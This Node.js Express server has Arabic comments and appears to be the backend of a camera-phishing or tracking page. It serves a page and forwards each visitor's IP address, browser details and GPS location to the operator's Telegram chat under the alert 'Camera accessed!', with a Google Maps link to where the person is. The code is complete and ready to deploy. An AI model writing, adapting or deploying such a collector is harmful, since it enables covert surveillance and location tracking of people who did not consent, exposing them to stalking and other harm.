const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();

// ============================================
// 🔑 قراءة التوكنات من بيئة المنصة
// ============================================
// هذه المتغيرات ستأتي من إعدادات المنصة (Render، Heroku، إلخ)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;

// ============================================
// ✅ التحقق من وجود التوكنات
// ============================================
if (!BOT_TOKEN) {
    console.error('❌ خطأ: BOT_TOKEN غير موجود في متغيرات البيئة');
    console.log('📌 يرجى إضافة BOT_TOKEN في إعدادات المنصة');
    process.exit(1);
}

if (!CHAT_ID) {
    console.error('❌ خطأ: CHAT_ID غير موجود في متغيرات البيئة');
    console.log('📌 يرجى إضافة CHAT_ID في إعدادات المنصة');
    process.exit(1);
}

console.log('✅ تم تحميل التوكنات من بيئة المنصة بنجاح');
console.log(`📌 البوت: ${BOT_TOKEN.substring(0, 15)}...`);
console.log(`📌 الدردشة: ${CHAT_ID}`);

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// 📨 دالة الإرسال إلى تليجرام
// ============================================
async function sendToTelegram(message) {
    try {
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        
        return { success: true, data: response.data };
    } catch (error) {
        console.error('❌ فشل الإرسال:', error.message);
        return { success: false, error: error.message };
    }
}

// ============================================
// 🌐 نقطة نهاية إرسال الإشعار
// ============================================
app.post('/notify-telegram', async (req, res) => {
    try {
        const { message, userIP, userAgent, location } = req.body;

        let text = `
📸 **تم الوصول للكاميرا!**

🕒 الوقت: ${new Date().toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' })}
🌐 IP: ${userIP || 'غير معروف'}
💻 المتصفح: ${userAgent || 'غير معروف'}
📝 رسالة: ${message || 'لا توجد'}
        `;

        if (location) {
            text += `\n📍 الموقع: https://www.google.com/maps?q=${location.lat},${location.lng}`;
        }

        const result = await sendToTelegram(text);

        if (result.success) {
            res.json({ success: true, data: result.data });
        } else {
            res.status(500).json({ success: false, error: result.error });
        }

    } catch (error) {
        console.error('❌ خطأ:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// 📩 Webhook لاستقبال رسائل (اختياري)
// ============================================
app.post('/webhook', (req, res) => {
    console.log('📩 وصول تحديث من تليجرام:', JSON.stringify(req.body, null, 2));
    res.sendStatus(200);
});

// ============================================
// 🏠 الصفحة الرئيسية
// ============================================
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// ============================================
// 🚀 تشغيل السيرفر
// ============================================
app.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل على http://localhost:${PORT}`);
    console.log(`📸 افتح الرابط في المتصفح`);
});
